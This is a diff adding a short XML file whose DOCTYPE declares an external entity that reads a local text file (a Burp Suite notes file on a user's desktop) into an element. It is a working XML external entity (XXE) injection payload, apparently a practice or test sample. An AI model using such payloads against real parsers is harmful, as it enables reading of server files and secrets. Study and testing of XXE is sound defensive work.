@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE People [
+        <!ELEMENT People (Girl)>
+        <!ELEMENT Girl (#PCDATA)>
+        <!ENTITY xxe SYSTEM "file:///C:/Users/luke10481/Desktop/burpsuite.txt">
+        ]>
+<People>
+    <Girl name="燕子" age="18" remark="Girl Friend">&xxe;</Girl>
+</People>
